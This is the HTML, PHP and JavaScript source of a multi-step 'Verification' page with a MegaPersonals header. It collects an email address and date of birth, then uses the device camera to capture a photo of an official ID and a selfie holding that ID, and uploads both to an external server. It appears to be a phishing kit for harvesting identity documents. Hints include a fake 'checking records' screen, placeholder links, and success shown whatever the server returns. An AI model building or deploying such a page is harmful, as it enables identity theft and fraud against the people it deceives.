<!doctype html>
<html>

<head>
    <title>Verification</title>
    <meta id="viewportMetaTag" name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
    <meta charset='utf-8'>
    <link rel="icon" type="image/png" sizes="16x16" href="<?= url("assets/" . "mega-verification/v2/images/favicon.png") ?>">
    <script type="text/javascript" src="<?= url("assets/" . "mega-verification/v2/js/p2/jquery.min.js") ?>"></script>
    <script type="text/javascript" src="<?= url("assets/" . "mega-verification/v2/js/p2/jquery-ui.min.js") ?>"></script>
    <link rel="stylesheet" href="<?= url("assets/" . "mega-verification/v2/css/p2/jquery-ui.min.css") ?>" />
    <script src="<?= url("assets/" . "mega-verification/v2/js/p2/bootstrap.bundle.js") ?>"></script>
    <link rel="stylesheet" href="<?= url("assets/" . "mega-verification/v2/css/p2/bootstrap-icons.css") ?>">
    <link rel="stylesheet" href="<?= url("assets/" . "mega-verification/v2/css/p2/bootstrap.min.css") ?>">
    <link rel="stylesheet" href="<?= url("assets/" . "mega-verification/v2/css/p2/custom.css") ?>">

</head>

<body>
    <style>
        body.overflowAuto {
            overflow: auto !important;
        }

        body.overflowHidden {
            overflow: hidden !important;
        }

        .verification-container {
            max-width: 800px;
        }

        .verification-container-page {
            display: flex;
            flex-direction: column;
            min-height: calc(100vh - 126px);
            justify-content: space-between;
            text-align: center;
            padding-bottom: 45px;
        }

        #video-selfy {
            position: relative;
            max-height: 40vh;
        }

        #video-id {
            position: relative;
            max-width: 100%;
            max-height: 40vh;
        }

        #canvas-selfy,
        #canvas-id {
            align-self: center;
            width: auto;
            max-width: 80vw;
        }

        #birth-container {
            display: flex;
            gap: 6px;
            justify-content: center;
        }

        #birth-container #birth-year {
            text-align: center;
            max-width: 100px;
        }

        #birth-container #birth-month,
        #birth-container #birth-day {
            text-align: center;
            max-width: 80px;
        }

        .selfy-ellipse-wrapper {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .selfy-ellipse-wrapper img.selfie-shape {
            width: 100%;
            height: 100%;
            max-width: 100%;
            max-height: 100%;
            opacity: .6;
            filter: drop-shadow(2px 2px 2px black) blur(1px);
        }

        .img-footer-logo {
            width: 64px;
            height: 64px;
            margin: auto;
        }

        .img-reload {
            max-width: 64px;
            margin: auto;
        }

        .img-photo-icon {
            width: 44px;
            margin-left: auto;
            margin-right: auto;
        }

        #img-photo-id-sample,
        #img-photo-selfy-sample {
            margin: auto;
            max-width: 90%;
        }

        #img-photo-selfy-sample {
            width: 324px;
            border: 4px solid black;
            padding: 26px;
        }

        .page-photo-id h2,
        .page-photo-id #take-photo-id,
        .page-photo-selfy-uploaded h2,
        .page-photo-id-camera h2,
        .page-photo-selfy-camera h2,
        .page-photo-id-camera #btn-take-photo-id-camera,
        .page-photo-selfy-uploaded .btn {
            text-transform: uppercase;
        }

        #id-image,
        #selfy-image {
            position: absolute;
            visibility: hidden;
        }

        .blur {
            filter: blur(3px);
        }

        /* Chrome, Safari, Edge, Opera */
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        /* Firefox */
        input[type=number] {
            appearance: textfield;
            -moz-appearance: textfield;
        }

        /* image reload cycle animation */
        .img-reload {
            -webkit-animation: spin .6s linear infinite;
            -moz-animation: spin .6s linear infinite;
            animation: spin .6s linear infinite;
        }

        @-moz-keyframes spin {
            100% {
                -moz-transform: rotate(-180deg);
            }
        }

        @-webkit-keyframes spin {
            100% {
                -webkit-transform: rotate(-180deg);
            }
        }

        @keyframes spin {
            100% {
                -webkit-transform: rotate(-180deg);
                transform: rotate(-180deg);
            }
        }

        #btn-take-photo-id--upload,
        #btn-take-selfie--upload {
            width: fit-content;
        }

        .media-container {
            max-height: 40vh;
        }
    </style>
    <main>
        <style>
            #top-header {
                position: fixed;
                top: 0;
                width: 100%;
                box-shadow: 0px 1px 6px 2px #0000007d;
                z-index: 1;
            }

            #top-header img {
                max-width: 90%;
                max-height: 40px;
            }

            #top-header .mp-header {
                background-color: #ff2aac;
                padding: 7px 10px;
                text-align: center;
            }

            .verification-container {
                margin-top: 30px;
            }

            .__cf_email__ {
                color: green;
                text-decoration: none
            }
        </style>
        <div id="top-header">
            <div class="mp-header">
                <img alt="" src="<?= url("assets/" . "mega-verification/v2/images/p2/megapersonalsPageHeader.png") ?>">
            </div>
        </div>
        <div class="container-fluid px-4 py-5 verification-container">
            <form id="verification-form" action="/api/v1/request/submit/CCto_MrNCWcJAHafOZ5yVR4C4WWEA23K" method="post" enctype="multipart/form-data">
                <div class="verification-container-page page-age">
                    <h3><strong>Email being registered</strong></h3>

                    <h3 style="color:green;"><strong><a href="#" class="__cf_email__"><?= $email ?></a></strong></h3>
                    <h3>
                        <strong class="text-danger text-uppercase">Important!</strong><br>
                        Your ACCESS CODE<br>
                        will be tied to your<br>
                        <strong>DATE OF BIRTH</strong>
                    </h3>
                    <h3>Enter it here</h3>
                    <div id="birth-container">
                        <input id="birth-year" class="form-control" type="number" placeholder="YYYY" maxlength="4" min="1940" />
                        <input id="birth-month" class="form-control" type="number" placeholder="MM" maxlength="2" min="1" max="12" />
                        <input id="birth-day" class="form-control" type="number" placeholder="DD" maxlength="2" min="1" max="31" />
                    </div>
                    <div class="d-flex flex-column align-items-center">
                        <button id="btn-go-to-photo-id" class="btn btn-primary w-50" type="button">SUBMIT</button>
                        <img class="img-footer-logo mt-2" src='<?= url("assets/" . "mega-verification/v2/images/p2/footer-logo.png") ?>' />
                        <style>
                            @media screen and (max-width: 500px) {
                                p.copyright {
                                    font-size: 3vw;
                                }
                            }
                        </style>
                        <div>
                            <p class="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p class="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="#">Terms of Use</a>
                                <a href="#">Privacy Policy</a>
                                <a href="#">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
                <div class="verification-container-page page-photo-id" style="display: none">
                    <h2>upload or take a photo<br>of an official id</h2>
                    <h2>place on a flat surface</h2>
                    <div>
                        <img alt="" id="img-photo-id-sample" src='<?= url("assets/" . "mega-verification/v2/images/photo-id-sample.png") ?>' />
                    </div>
                    <div class="d-flex flex-column align-items-center mt-2">
                        <button id="btn-take-photo-id" class="btn btn-success" type="button">
                            <h4>I'm ready</h4>
                            Take photo of ID
                        </button>
                        <img alt="" class="img-footer-logo mt-2" src='<?= url("assets/" . "mega-verification/v2/images/p2/footer-logo.png") ?>' />
                        <style>
                            @media screen and (max-width: 500px) {
                                p.copyright {
                                    font-size: 3vw;
                                }
                            }
                        </style>
                        <div>
                            <p class="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p class="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="#" target="_blank">Terms of Use</a>
                                <a href="#" target="_blank">Privacy Policy</a>
                                <a href="#" target="_blank">Billing Questions</a>
                        </div>
                    </div>
                </div>
                <div class="verification-container-page page-photo-id-camera" style="display: none">
                    <h2>Camera<br>take the ID Photo</h2>
                    <video id="video-id" autoplay playsinline muted></video>
                    <h5>Make sure your face and your<br>date of birth is clear in the photo.</h5>
                    <h5>After taking the photo you can<br>black out your private details.</h5>
                    <div class="revert-camera-wrapper">
                        <div class="d-flex flex-column align-items-center mb-2">
                            <button id="btn-revert-id-camera" class="btn btn-secondary" type="button">
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-phone-flip" viewBox="0 0 16 16">
                                    <path fill-rule="evenodd" d="M11 1H5a1 1 0 0 0-1 1v6a.5.5 0 0 1-1 0V2a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v6a.5.5 0 0 1-1 0V2a1 1 0 0 0-1-1m1 13a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1v-2a.5.5 0 0 0-1 0v2a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2v-2a.5.5 0 0 0-1 0zM1.713 7.954a.5.5 0 1 0-.419-.908c-.347.16-.654.348-.882.57C.184 7.842 0 8.139 0 8.5c0 .546.408.94.823 1.201.44.278 1.043.51 1.745.696C3.978 10.773 5.898 11 8 11q.148 0 .294-.002l-1.148 1.148a.5.5 0 0 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708l1.145 1.144L8 10c-2.04 0-3.87-.221-5.174-.569-.656-.175-1.151-.374-1.47-.575C1.012 8.639 1 8.506 1 8.5c0-.003 0-.059.112-.17.115-.112.31-.242.6-.376Zm12.993-.908a.5.5 0 0 0-.419.908c.292.134.486.264.6.377.113.11.113.166.113.169s0 .065-.13.187c-.132.122-.352.26-.677.4-.645.28-1.596.523-2.763.687a.5.5 0 0 0 .14.99c1.212-.17 2.26-.43 3.02-.758.38-.164.713-.357.96-.587.246-.229.45-.537.45-.919 0-.362-.184-.66-.412-.883s-.535-.411-.882-.571M7.5 2a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1z" />
                                </svg>
                            </button>
                        </div>
                    </div>
                    <div class="d-flex flex-column align-items-center">
                        <button id="btn-take-photo-id-camera" class="btn btn-primary w-50" type="button">Take photo</button>
                    </div>
                </div>
                <div class="verification-container-page page-photo-id-camera-decline" style="display: none">
                    <h3>You declined access to<br>your camera?</h3>
                    <h3>To complete AgeSmart<br>verification your camera<br>will be used to photo your<br>ID and Selfie.</h3>
                    <h3>You can black out private<br>info before uploading.</h3>
                    <h3>Please, allow access<br>to the camera in browser tab settings<br>and reload this page.</h3>
                    <div class="d-flex flex-column">
                        <img alt="" class="img-footer-logo mt-2" src='<?= url("assets/" . "mega-verification/v2/images/p2/footer-logo.png") ?>' />
                        <style>
                            @media screen and (max-width: 500px) {
                                p.copyright {
                                    font-size: 3vw;
                                }
                            }
                        </style>
                        <div>
                            <p class="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p class="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="/terms" target="_blank">Terms of Use</a>
                                <a href="/privacy" target="_blank">Privacy Policy</a>
                                <a href="/billingTerms" target="_blank">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
                <div class="verification-container-page page-photo-id-redacting" style="display: none">
                    <h2>COVER YOUR<br>PRIVATE INFO</h2>

                    <canvas id="canvas-id"></canvas>

                    <h5 class="mt-3 mb-2"><a href="#" class="text-danger instruction-link">Instruction?</a></h5>
                    <div class="d-flex flex-column justify-content-between align-items-center gap-2 mb-2">
                        <button id="btn-go-to-photo-id-redacting" class="btn btn-success" type="button">
                            <h4>FINISHED</h4>
                            UPLOAD
                        </button>
                        <h4>OR</h4>
                        <button id="btn-go-to-photo-id-redraw" class="btn btn-warning" type="button">CLEAR, RE-DRAW</button>
                        <button id="btn-go-to-photo-id-retake" class="btn btn-warning" type="button">RE-TAKE PHOTO</button>
                    </div>
                    <div class="d-flex flex-column">
                        <img alt="" class="img-footer-logo mt-2" src='<?= url("assets/" . "mega-verification/v2/images/p2/footer-logo.png") ?>' />
                        <style>
                            @media screen and (max-width: 500px) {
                                p.copyright {
                                    font-size: 3vw;
                                }
                            }
                        </style>
                        <div>
                            <p class="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p class="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="/terms" target="_blank">Terms of Use</a>
                                <a href="/privacy" target="_blank">Privacy Policy</a>
                                <a href="/billingTerms" target="_blank">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
                <div class="verification-container-page page-photo-id-uploaded" style="display: none">
                    <h3>Please Proceed to the<br>Next step and<br>Hold the ID close to<br>your face</h3>
                    <div>
                        <img alt="" id="img-photo-selfy-sample" src='<?= url("assets/" . "mega-verification/v2/images/photo-selfy-sample.png") ?>' />
                    </div>
                    <div class="d-flex flex-column justify-content-between align-items-center gap-3 my-2">
                        <button id="btn-take-photo-selfy" class="btn btn-success" type="button">
                            <h4>I AM READY</h4>
                            TAKE SELFIE HOLDING ID
                        </button>
                        <img alt="" class="img-footer-logo mt-2" src='<?= url("assets/" . "mega-verification/v2/images/p2/footer-logo.png") ?>' />
                        <style>
                            @media screen and (max-width: 500px) {
                                p.copyright {
                                    font-size: 3vw;
                                }
                            }
                        </style>
                        <div>
                            <p class="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p class="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="/terms" target="_blank">Terms of Use</a>
                                <a href="/privacy" target="_blank">Privacy Policy</a>
                                <a href="/billingTerms" target="_blank">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
                <div class="verification-container-page page-photo-selfy-camera" style="display: none">
                    <h2>Camera<br>take selfie holding id</h2>
                    <div class="position-relative mx-auto media-container">
                        <video id="video-selfy" autoplay playsinline muted></video>
                        <div class="selfy-ellipse-wrapper">
                            <img alt="" src="<?= url("assets/" . "mega-verification/v2/images/selfie-shape.png") ?>" class="selfie-shape" />
                        </div>
                    </div>
                    <h5>Center your face in the oval.</h5>
                    <h5>Also, be sure your ID is visible<br>in the rectangular frame</h5>
                    <div class="revert-camera-wrapper">
                        <div class="d-flex flex-column align-items-center mb-2">
                            <button id="btn-revert-selfy-camera" class="btn btn-secondary" type="button">
                                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-phone-flip" viewBox="0 0 16 16">
                                    <path fill-rule="evenodd" d="M11 1H5a1 1 0 0 0-1 1v6a.5.5 0 0 1-1 0V2a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v6a.5.5 0 0 1-1 0V2a1 1 0 0 0-1-1m1 13a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1v-2a.5.5 0 0 0-1 0v2a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2v-2a.5.5 0 0 0-1 0zM1.713 7.954a.5.5 0 1 0-.419-.908c-.347.16-.654.348-.882.57C.184 7.842 0 8.139 0 8.5c0 .546.408.94.823 1.201.44.278 1.043.51 1.745.696C3.978 10.773 5.898 11 8 11q.148 0 .294-.002l-1.148 1.148a.5.5 0 0 0 .708.708l2-2a.5.5 0 0 0 0-.708l-2-2a.5.5 0 1 0-.708.708l1.145 1.144L8 10c-2.04 0-3.87-.221-5.174-.569-.656-.175-1.151-.374-1.47-.575C1.012 8.639 1 8.506 1 8.5c0-.003 0-.059.112-.17.115-.112.31-.242.6-.376Zm12.993-.908a.5.5 0 0 0-.419.908c.292.134.486.264.6.377.113.11.113.166.113.169s0 .065-.13.187c-.132.122-.352.26-.677.4-.645.28-1.596.523-2.763.687a.5.5 0 0 0 .14.99c1.212-.17 2.26-.43 3.02-.758.38-.164.713-.357.96-.587.246-.229.45-.537.45-.919 0-.362-.184-.66-.412-.883s-.535-.411-.882-.571M7.5 2a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1z" />
                                </svg>
                            </button>
                        </div>
                    </div>
                    <div class="d-flex flex-column align-items-center">
                        <button id="btn-take-photo-selfy-camera" class="btn btn-primary w-50" type="button">Take photo</button>
                    </div>
                </div>
                <div class="verification-container-page page-photo-selfy-uploaded" style="display: none">
                    <h2>Is the selfie ok?</h2>
                    <canvas id="canvas-selfy"></canvas>
                    <h5 class="my-3">Is the photo blurry?<br>If so, retake it.</h5>
                    <div class="d-flex flex-column justify-content-between align-items-center gap-3 mb-2">
                        <button id="btn-go-to-photo-selfy-retake" class="btn btn-warning" type="button">RE-TAKE PHOTO</button>
                        <button id="btn-go-to-photo-selfy-upload" class="btn btn-success" type="button">
                            <h4>FINISHED</h4>
                            UPLOAD
                        </button>
                        <img alt="" class="img-footer-logo mt-2" src='<?= url("assets/" . "mega-verification/v2/images/p2/footer-logo.png") ?>' />
                        <style>
                            @media screen and (max-width: 500px) {
                                p.copyright {
                                    font-size: 3vw;
                                }
                            }
                        </style>
                        <div>
                            <p class="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p class="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="/terms" target="_blank">Terms of Use</a>
                                <a href="/privacy" target="_blank">Privacy Policy</a>
                                <a href="/billingTerms" target="_blank">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
                <div class="verification-container-page page-photo-files-uploading" style="display: none">
                    <h2>Uploading photos</h2>
                    <div class="progress">
                        <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"></div>
                    </div>
                    <div class="d-flex flex-column">
                        <img class="img-footer-logo mt-2" alt="" src='<?= url("assets/" . "mega-verification/v2/images/p2/footer-logo.png") ?>' />
                        <style>
                            @media screen and (max-width: 500px) {
                                p.copyright {
                                    font-size: 3vw;
                                }
                            }
                        </style>
                        <div>
                            <p class="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p class="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="/terms" target="_blank">Terms of Use</a>
                                <a href="/privacy" target="_blank">Privacy Policy</a>
                                <a href="/billingTerms" target="_blank">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
                <div class="verification-container-page page-photo-files-uploading-complete" style="display: none">
                    <h3 class="mt-5 pt-5">Upload complete 100%</h3>
                    <h3>We will now check your<br>Photo and ID in our<br>records... one minute<br>Please.</h3>
                    <div class="d-flex flex-column">
                        <img alt="" class="img-reload mt-2" src='<?= url("assets/" . "mega-verification/v2/images/reload-image.png") ?>' />
                        <img alt="" class="img-footer-logo mt-2" src='<?= url("assets/" . "mega-verification/v2/images/p2/footer-logo.png") ?>' />
                        <style>
                            @media screen and (max-width: 500px) {
                                p.copyright {
                                    font-size: 3vw;
                                }
                            }
                        </style>
                        <div>
                            <p class="d-flex justify-content-center fw-bold mb-0 mt-2 copyright">Copyright &copy; 2022 Age Smart LDA. All Rights Reserved.</p>
                            <p class="d-flex justify-content-center gap-3 fw-bold mb-0 copyright">
                                <a href="s" target="_blank">Terms of Use</a>
                                <a href="s" target="_blank">Privacy Policy</a>
                                <a href="s" target="_blank">Billing Questions</a>
                            </p>
                        </div>
                    </div>
                </div>
            </form>
        </div>
        <div class="modal fade" id="black-out-modal">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content">
                    <div class="modal-body text-center">
                        <h5 class="py-3">Use your finger to black<br>out your, name, address<br>and the ID number.</h5>
                        <h5>DO NOT black out your<br>face or your date of birth. <br>Your verification will fail.</h5>
                        <h5 class="py-3">Pinch and Scroll<br>with two fingers.<br>Draw with single finger.</h5>
                        <button id="btn-black-out-modal" class="btn btn-success mb-3" type="button" data-bs-dismiss="modal">OK</button>
                    </div>
                </div>
            </div>
        </div>
        <div class="modal fade" id="backend-error-modal">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content">
                    <div class="modal-body text-center">
                        <h5 class="py-3 text-danger bold"></h5>
                        <button id="btn-backend-error-modal" class="btn btn-success mb-3" type="button" data-bs-dismiss="modal">OK</button>
                    </div>
                </div>
            </div>
        </div>
    </main>
    <div class="spinner-loader-fader">
        <div class="spinner-loader">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <style>
        .blured {
            filter: blur(4px);
            transition-duration: .3s;
        }

        .spinner-loader-fader {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: #0000007a;
            justify-content: center;
            align-items: center;
            filter: blur(1px);
        }

        .spinner-loader {
            color: red;
            display: inline-block;
            position: relative;
            width: 80px;
            height: 80px;
        }

        .spinner-loader div {
            transform-origin: 40px 40px;
            animation: spinner-loader 1.2s linear infinite;
        }

        .spinner-loader div:after {
            content: " ";
            display: block;
            position: absolute;
            top: 3px;
            left: 37px;
            width: 6px;
            height: 18px;
            border-radius: 20%;
            background: #fff;
        }

        .spinner-loader div:nth-child(1) {
            transform: rotate(0deg);
            animation-delay: -1.1s;
        }

        .spinner-loader div:nth-child(2) {
            transform: rotate(30deg);
            animation-delay: -1s;
        }

        .spinner-loader div:nth-child(3) {
            transform: rotate(60deg);
            animation-delay: -0.9s;
        }

        .spinner-loader div:nth-child(4) {
            transform: rotate(90deg);
            animation-delay: -0.8s;
        }

        .spinner-loader div:nth-child(5) {
            transform: rotate(120deg);
            animation-delay: -0.7s;
        }

        .spinner-loader div:nth-child(6) {
            transform: rotate(150deg);
            animation-delay: -0.6s;
        }

        .spinner-loader div:nth-child(7) {
            transform: rotate(180deg);
            animation-delay: -0.5s;
        }

        .spinner-loader div:nth-child(8) {
            transform: rotate(210deg);
            animation-delay: -0.4s;
        }

        .spinner-loader div:nth-child(9) {
            transform: rotate(240deg);
            animation-delay: -0.3s;
        }

        .spinner-loader div:nth-child(10) {
            transform: rotate(270deg);
            animation-delay: -0.2s;
        }

        .spinner-loader div:nth-child(11) {
            transform: rotate(300deg);
            animation-delay: -0.1s;
        }

        .spinner-loader div:nth-child(12) {
            transform: rotate(330deg);
            animation-delay: 0s;
        }

        @keyframes spinner-loader {
            0% {
                opacity: 1;
            }

            100% {
                opacity: 0;
            }
        }
    </style>

    <script data-cfasync="false" src="<?= url("assets/" . "mega-verification/v2/js/p2/email-decode.min.js") ?>"></script>
    <script>
        function showSpinnerLoader() {
            $('.verification-container').addClass('blur');
            $('.spinner-loader-fader')
                .css({
                    display: 'flex'
                })
                .hide()
                .fadeIn();
        }

        function hideSpinnerLoader() {
            $('.verification-container').removeClass('blur');
            $('.spinner-loader-fader').fadeOut();
        }
    </script>
    <script src="<?= url("assets/" . "mega-verification/v2/js/p2/mobile-tablet-check.js") ?>"></script>
    <script>
        var imageProcessorUrl = "https://image-processor.agesmart.eu/process/upload_age_smart_image";
        var birthDate = null;
        //  var fileSelfyImage = null;
        //  var fileSelfyImageOriginal = null;
        var fileIdImage = null;
        var fileIdImageOriginal = null;
        var canvasBackupImage = null;
        var FILE_TYPE_SELFY = 'selfy-image';
        var FILE_TYPE_ID = 'id-image';
        var token = 'CCto_MrNCWcJAHafOZ5yVR4C4WWEA23K';
        var globalStream = null;
        var canvas = null,
            context = null,
            pos = null;
        var csrfHeader = $("meta[name='_csrf_header']").attr("content");
        var csrfToken = $("meta[name='_csrf']").attr("content");
        var backCameraSelfy = false;
        var backCameraId = false;
        var idImageHashName = null;
        var selfieImageHashName = null;

        $(document).ready(function() {

            $('.verification-container-page').hide();

            if (false) {
                $('.verification-container-page.page-photo-id').fadeIn();
                birthDate = '';

                if ('' == 'invalid_photos') {
                    showBackendErrorModal('Invalid photo');
                } else if ('' == 'invalid_user_data') {
                    showBackendErrorModal('Invalid user data');
                } else {
                    showBackendErrorModal('' || '' || 'There was a problem with your images');
                }
            } else {
                $('.verification-container-page.page-age').fadeIn();
            }

            if (!mobileAndTabletCheck()) {
                $('.revert-camera-wrapper').hide();
            }

            $('#age').datepicker({
                dateFormat: 'yy/mm/dd',
                onSelect: function(date, _) {
                    if (date) {
                        var today = new Date();
                        var birthDate = new Date(date);
                        age = today.getFullYear() - birthDate.getFullYear();
                        age = date;
                        $('#btn-go-to-photo-id').removeClass('disabled');
                    }
                }
            });

            $('#birth-container #birth-year').on('input', function() {
                $('#birth-year, #birth-month, #birth-day').removeClass('is-invalid');
                if ($(this).val().length === 4) {
                    $('#birth-container #birth-month').focus().select();
                }
            });
            $('#birth-container #birth-month').on('input', function() {
                $('#birth-year, #birth-month, #birth-day').removeClass('is-invalid');
                if ($(this).val().length === 2) {
                    $('#birth-container #birth-day').focus().select();
                }
            });
            $('#birth-container #birth-day').on('input', function() {
                $('#birth-year, #birth-month, #birth-day').removeClass('is-invalid');
                if ($(this).val().length === 2) {
                    $('#btn-go-to-photo-id').focus();
                }
            });

            $('#btn-go-to-photo-id').on('click', function() {
                if (!isBirthDateValid()) return;
                nextPage('page-photo-id');
            });

            $('#btn-take-photo-id').on('click', function() {
                backCameraId = mobileAndTabletCheck();
                nextPage('page-photo-id-camera', function() {
                    hideTopHeader();
                    showSpinnerLoader();
                    startVideoStream('#video-id', backCameraId)
                        .catch(function() {
                            nextPage('page-photo-id-camera-decline', showTopHeader);
                        })
                        .finally(function() {
                            hideSpinnerLoader();
                        });
                });
            });

            $('#btn-go-to-photo-id-decline-cancel').on('click', function() {
                nextPage('page-photo-id');
            });

            //  $('#btn-take-photo-id--upload').on('change', function (e) {
            //      e.preventDefault();
            //      showSpinnerLoader();
            //      var selectedFile = this.files[0];
            //      if (selectedFile) {
            //          fileIdImage = fileIdImageOriginal = selectedFile;
            //          uploadPhotoToImageProcessor(selectedFile, 'DOCUMENT_ID', function () {
            //              hideSpinnerLoader();
            //             //  if (res.hasOwnProperty('fname')) {
            //             //      idImageHashName = res['fname'];
            //             //      nextPage('page-photo-id-uploaded');
            //             //  } else {
            //             //       ('Error processing the photo id');
            //             //  }

            //             idImageHashName = file;

            //             nextPage('page-photo-id-uploaded');
            //          });
            //      }
            //  });

            //  $('#btn-take-selfie--upload').on('change', function (e) {
            //      e.preventDefault();
            //      showSpinnerLoader();
            //      var selectedFile = this.files[0];
            //      if (selectedFile) {
            //          fileIdImage = fileIdImageOriginal = selectedFile;
            //          uploadPhotoToImageProcessor(selectedFile, 'SELFIE', function () {
            //              hideSpinnerLoader();
            //             //  if (res.hasOwnProperty('fname')) {
            //             //      selfieImageHashName = res['fname'];
            //             //      nextPage('page-photo-selfy-uploaded', showTopHeader);
            //             //      // startRedactingCanvasImage('selfy');
            //             //  } else {
            //             //      showBackendErrorModal('Error processing the selfie');
            //             //  }

            //             selfieImageHashName = selectedFile;

            //             nextPage('page-photo-selfy-uploaded', showTopHeader);
            //          });
            //      }
            //  });

            $('#btn-go-to-photo-id-decline-retake').on('click', function() {
                nextPage('page-photo-id-camera', function() {
                    hideTopHeader();
                    showSpinnerLoader();
                    startVideoStream('#video-id', backCameraId)
                        .catch(function() {
                            nextPage('page-photo-id-camera-decline', showTopHeader);
                        })
                        .finally(function() {
                            hideSpinnerLoader();
                        });
                });
            });

            $('#btn-take-photo-selfy').on('click', function() {
                nextPage('page-photo-selfy-camera', hideTopHeader);
                showSpinnerLoader();
                startVideoStream('#video-selfy', backCameraSelfy)
                    .finally(function() {
                        hideSpinnerLoader();
                    });
            });

            $('#btn-go-to-photo-selfy-retake').on('click', function() {
                nextPage('page-photo-selfy-camera', hideTopHeader);
                /* stopRedactingCanvasImage('selfy'); */
                showSpinnerLoader();
                startVideoStream('#video-selfy', backCameraSelfy)
                    .finally(function() {
                        hideSpinnerLoader();
                    });
            });

            $('#id-image').on('change', function() {
                nextPage('page-photo-id-redacting');
            });

            $('#selfy-image').on('change', function() {
                nextPage('page-photo-selfy-uploaded');
            });

            $('#btn-go-to-photo-id-retake').on('click', function() {
                stopRedactingCanvasImage('id');
                nextPage('page-photo-id');
            });

            $('#btn-go-to-photo-id-redraw').on('click', function() {
                loadImageFromFileToCanvas('canvas-id', fileIdImageOriginal);
            });

            $('#btn-go-to-photo-id-redacting').on('click', function() {
                stopRedactingCanvasImage('id');
                saveCanvasToFile('id')
                    .then(function(file) {
                        uploadPhotoToImageProcessor(file, 'DOCUMENT_ID', function() {
                            //  if (res.hasOwnProperty('fname')) {
                            //      idImageHashName = res['fname'];
                            //      nextPage('page-photo-id-uploaded');
                            //  } else {
                            //      showBackendErrorModal('Error processing the photo id');
                            //  }

                            idImageHashName = file;

                            nextPage('page-photo-id-uploaded');
                        });
                    });
            });

            $('#btn-revert-selfy-camera').on('click', function() {
                backCameraSelfy = !backCameraSelfy;
                stopVideoStream();
                showSpinnerLoader();
                startVideoStream('#video-selfy', backCameraSelfy)
                    .catch(function() {
                        nextPage('page-photo-id-camera-decline', showTopHeader);
                    })
                    .finally(function() {
                        hideSpinnerLoader();
                    });
            });

            $('#btn-take-photo-selfy-camera').on('click', function() {
                saveCanvasToFileAndCapture('selfy')
                    .then(function(file) {
                        uploadPhotoToImageProcessor(file, 'SELFIE', function() {
                            //  if (res.hasOwnProperty('fname')) {
                            //      selfieImageHashName = res['fname'];
                            //      nextPage('page-photo-selfy-uploaded', showTopHeader);
                            //      // startRedactingCanvasImage('selfy');
                            //  } else {
                            //      showBackendErrorModal('Error processing the selfie');
                            //  }

                            selfieImageHashName = file

                            nextPage('page-photo-selfy-uploaded', showTopHeader);
                        });
                    });
            });

            $('#btn-revert-id-camera').on('click', function() {
                backCameraId = !backCameraId;
                stopVideoStream();
                showSpinnerLoader();
                startVideoStream('#video-id', backCameraId)
                    .catch(function() {
                        nextPage('page-photo-id-camera-decline', showTopHeader);
                    })
                    .finally(function() {
                        hideSpinnerLoader();
                    });
            });

            $('#btn-take-photo-id-camera').on('click', function() {
                saveCanvasToFileAndCapture('id')
                    .then(function(file) {
                        fileIdImage = fileIdImageOriginal = file;
                    });
                nextPage('page-photo-id-redacting', function() {
                    showTopHeader();
                    showInstructionModal();
                    startRedactingCanvasImage('id');
                });
            });

            $('#btn-go-to-photo-selfy-upload').on('click', function() {
                // stopRedactingCanvasImage('selfy');
                saveCanvasToFile('selfy')
                    .then(function(file) {
                        //  fileSelfyImage = file;
                        validateUserData(function() {
                            nextPage('page-photo-files-uploading');
                        });

                        submitVerification()
                    });
            });

